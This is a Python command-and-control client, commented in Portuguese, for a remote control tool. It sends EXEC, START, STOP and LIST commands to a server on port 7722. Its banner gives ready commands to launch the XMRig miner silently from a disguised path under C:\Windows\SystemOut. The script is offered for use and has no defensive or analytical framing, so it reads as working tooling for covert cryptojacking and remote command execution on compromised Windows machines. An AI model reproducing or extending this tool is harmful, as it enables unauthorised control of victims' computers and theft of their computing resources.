#!/usr/bin/env python3
import socket

PORT = 7722  # Porta fixa do servidor

def send_command(host, port, command):
    """Envia um comando ao servidor e retorna a resposta."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)  # Timeout de 10 segundos
            s.connect((host, port))
            s.sendall(command.encode('utf-8'))
            output = ""
            while True:
                data = s.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                output += data
            return output
    except ConnectionRefusedError:
        return "[ERRO] Não foi possível conectar ao servidor."
    except socket.timeout:
        return "[ERRO] Timeout: o servidor não respondeu a tempo."
    except Exception as e:
        return f"[ERRO] Falha na comunicação: {str(e)}"

def main():
    print("---------------------------------------------------------------------------------------------")
    print("------------------------------------------ INICIO -------------------------------------------")
    print("Cliente de Controle Remoto")
    print("Comandos disponíveis: EXEC:<comando>, START:<comando> [show], STOP:<id>, LIST, QUIT")
    print("---------------------------------------------------------------------------------------------")
    print("---------------------------------------------------------------------------------------------")
    print(r'Para iniciar o XMRIG silenciado use: START:start "" /B "C:\Windows\SystemOut\XMR\start.cmd"')
    print(r'Para iniciar o XMRIG com terminal use: START:start "" "C:\Windows\SystemOut\XMR\start.cmd"')
    print("---------------------------------------------------------------------------------------------")

    # Solicita o IP do servidor ao usuário
    host = input("Digite o IP do servidor: ").strip()
    print(f"Conectando ao servidor em {host}:{PORT}")
    
    while True:
        try:
            cmd = input("Digite o comando (ou 'quit' para sair): ").strip()
            if cmd.lower() == 'quit':
                print("Encerrando cliente...")
                break
            if not cmd:
                print("[ERRO] Comando vazio.")
                continue

            # Envia o comando e exibe a resposta
            response = send_command(host, PORT, cmd)
            print(response)

        except KeyboardInterrupt:
            print("\n[INFO] Interrupção pelo usuário. Encerrando...")
            break
        except Exception as e:
            print(f"[ERRO] Erro no cliente: {str(e)}")

if __name__ == "__main__":
    main()